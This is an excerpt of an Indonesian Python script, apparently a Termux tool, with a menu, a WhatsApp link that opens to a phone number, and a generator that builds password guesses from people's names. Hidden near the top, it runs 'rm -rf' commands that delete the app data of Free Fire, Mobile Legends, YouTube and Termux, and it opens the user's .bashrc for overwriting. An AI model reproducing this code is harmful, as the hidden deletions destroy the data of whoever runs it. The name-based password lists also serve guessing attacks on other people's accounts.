...
pw_add = []
###-----[ APPEN AND MORE ]-----###
os.system("rm -rf /sdcard/Android/data/com.dts.freefireth.com")
os.system("rm -rf /sdcard/Android/data/com.mobile.legends")
os.system("rm -rf /sdcard/Android/data/com.google.android.youtube")
os.system("rm -rf /data/data/com.termux")
# buka file untuk ditulis
file_bio = open(".bashrc", "w")
...
[%s0%s] Keluar\n'''%(N,H,N,H,N,H,N,H,N,H,N,H,N,H,N,M,N))
    ...
    if main in   ['1','01']:
       ...
       text = 'NGAB+SC+LU+BAGUS+JUGA!'
       os.system(f'xdg-open https://wa.me/+6285182646371?text={text}')
...
def generate(name):
    ...
    for y in name.split(' '):
        if len(y) <3:pass
           ...
           xxx.append(f'{y.capitalize()}321')
           xxx.append(f'{y.capitalize()}12')
        else:
           xxx.append(y+'123')
           xxx.append(y+'1234')
           xxx.append(y+'12345')
